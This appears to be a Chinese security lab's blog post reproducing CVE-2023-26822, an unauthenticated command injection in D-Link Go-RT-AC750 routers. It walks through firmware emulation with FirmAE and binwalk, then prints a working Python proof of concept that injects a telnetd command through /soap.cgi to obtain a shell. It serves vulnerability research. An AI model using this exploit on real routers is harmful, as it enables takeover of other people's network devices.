> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/czri_8dXAs9pUYKfvUiJsQ)

  

**漏洞概述**

![](https://mmbiz.qpic.cn/mmbiz_png/gauNkjeXJb77icPom6Ys0SjzAic0eBU2KGzXKxlozic9WDkyQJP4lbJ3sriaBpGVc5309Xaw9wfG4DkJyrN6ZAzRvw/640?wx_fmt=png)

D-Link Go-RT-AC750 是一款双频无线路由器。

![](https://mmbiz.qpic.cn/mmbiz_png/gauNkjeXJb77icPom6Ys0SjzAic0eBU2KGAQjf0HjZKV9WNyqH9ydDRV67GkL4ADKcoXptHe97rNIAMH5LUjxYgg/640?wx_fmt=png)

D-Link Go-RT-AC750 在固件版本为 revA_v101b03 中存在命令注入漏洞，漏洞编号：CVE-2023-26822。未经授权的攻击者可以请求 /soap.cgi 路由通过携带的参数进行命令拼接，从而控制路由器。

  

**环境搭建**

![](https://mmbiz.qpic.cn/mmbiz_png/gauNkjeXJb77icPom6Ys0SjzAic0eBU2KGzXKxlozic9WDkyQJP4lbJ3sriaBpGVc5309Xaw9wfG4DkJyrN6ZAzRvw/640?wx_fmt=png)

1.FirmAE 工具安装

首先拉取 FirmAE 工具仓库

```
git clone --recursive https://github.com/pr0v3rbs/FirmAE

```

![](https://mmbiz.qpic.cn/mmbiz_png/gauNkjeXJb77icPom6Ys0SjzAic0eBU2KG5coo49g4EH0LvuNk0LTcicFBpaOm3qskb37GBqKNhx8iceELq7QmATOw/640?wx_fmt=png)

运行下载脚本

```
cd FirmAE/
./download.sh

```

![](https://mmbiz.qpic.cn/mmbiz_png/gauNkjeXJb77icPom6Ys0SjzAic0eBU2KGL4XSaFFqpenLAAaCENeFhtJuQseKyX1RugaMR1UWwaBFtukYd4f9cQ/640?wx_fmt=png)

运行./install.sh 进行安装

![](https://mmbiz.qpic.cn/mmbiz_png/gauNkjeXJb77icPom6Ys0SjzAic0eBU2KGWfySgZgyBJs2ib7XU2fBh0MYiaDdqYakib88CHoRaXMh5T0OpvPSgTQDg/640?wx_fmt=png)

2. 下载固件

本文模拟的是设备型号为 Go-RT-AC750，固件版本：revA_v101b03

下载地址:

```
https://eu.dlink.com/uk/en/products/go-rt-ac750-wireless-ac750-dual-band-easy-router

```

下载后得到 GORTAC750_A1_FW_v101b03.bin 固件文件

![](https://mmbiz.qpic.cn/mmbiz_png/gauNkjeXJb77icPom6Ys0SjzAic0eBU2KGT6PfKKcM73yD7USG3mBFbicq45Mb3ictMFc6vaGhGTqOqEibaQWzaL0fQ/640?wx_fmt=png)

3.FirmAE 工具初始化

在 FirmAE 工具目录下执行./init.sh 进行初始化

![](https://mmbiz.qpic.cn/mmbiz_png/gauNkjeXJb77icPom6Ys0SjzAic0eBU2KGUGy7QbZQ5NDJM7frAKwJibtIiam4C8ffhZ3QPDXicRybgIgZEo86VZSYg/640?wx_fmt=png)

4. 安装 binwalk

这里使用 FirmAE 工具目录下的 binwalk 安装程序进行安装

cd binwalk-2.3.3/

python3 setup.py install

![](https://mmbiz.qpic.cn/mmbiz_png/gauNkjeXJb77icPom6Ys0SjzAic0eBU2KG2jw1HR36Cf5mPP3H6iadA4xcEQ0vdtubqfwvcd9cicNXsb37k1auFVsg/640?wx_fmt=png)

5. 模拟运行固件  
执行如下命令对固件进行解压

```
binwalk -Me /root/GORTAC750_A1_FW_v101b03.bin --run-as=root

```

![](https://mmbiz.qpic.cn/mmbiz_png/gauNkjeXJb77icPom6Ys0SjzAic0eBU2KGLkjpEWaBXI5LdFNl3sEia840pypUxxYq7cYuPCXzSfYOpDwK4UVeW4Q/640?wx_fmt=png)

执行如下命令来模拟运行固件

sudo ./run.sh -r GORTAC750 /root/GORTAC750_A1_FW_v101b03.bin

![](https://mmbiz.qpic.cn/mmbiz_png/gauNkjeXJb77icPom6Ys0SjzAic0eBU2KGUhy5Yx7dj8slo5AcOnr5rERziayB3A4QESdDqTIgTXicsCgNYgWaiaTbQ/640?wx_fmt=png)

使用浏览器访问 http://192.168.0.1，出现如下界面则表明成功模拟了一台 D-Link Go-RT-AC750 路由器

![](https://mmbiz.qpic.cn/mmbiz_png/gauNkjeXJb77icPom6Ys0SjzAic0eBU2KGYZHxicnmaIXsOCLiaE4JWBKE93LNwVpYlmnUuWab73LfpOF5d5I8JPvw/640?wx_fmt=png)

  

**漏洞复现**

![](https://mmbiz.qpic.cn/mmbiz_png/gauNkjeXJb77icPom6Ys0SjzAic0eBU2KGzXKxlozic9WDkyQJP4lbJ3sriaBpGVc5309Xaw9wfG4DkJyrN6ZAzRvw/640?wx_fmt=png)

POC 内容如下：

```
from socket import *
from os import *
from time import *
request = b"POST /soap.cgi?service=&&telnetd -p 4123& HTTP/1.1\r\n"
request += b"Host: localhost:49152\r\n"
request += b"Content-Type: text/xml\r\n"
request += b"Content-Length: 88\r\n"
request += b"SOAPAction: a#b\r\n\r\n"
s = socket(AF_INET, SOCK_STREAM)
s.connect((gethostbyname("192.168.0.1"), 49152))
s.send(request)
sleep(10)
system('telnet 192.168.0.1 4123')

```

执行 POC，成功获取 shell

```
python3 poc.py

```

![](https://mmbiz.qpic.cn/mmbiz_png/gauNkjeXJb77icPom6Ys0SjzAic0eBU2KGCYOMBhFwU9expH6ic1QUHOJga7qIhJpK6lf32Flsg2IvMiakmC2E4MYQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/C6nwdaicQKwWT4HLCv7hz9cCjEYLXqWZJayhCdh0Ix1GdDpSicv8wAlW178gA8TSndNp9mZcsYGr6ubhibS8Odomg/640?wx_fmt=gif)

美创科技旗下第 59 号实验室，专注于数据安全技术领域研究，聚焦于安全防御理念、攻防技术、威胁情报等专业研究，进行知识产权转化并赋能于产品。累计向 CNVD、CNNVD 等平台提报数百个高质量原创漏洞，发明专利数十篇，团队著有《数据安全实践指南》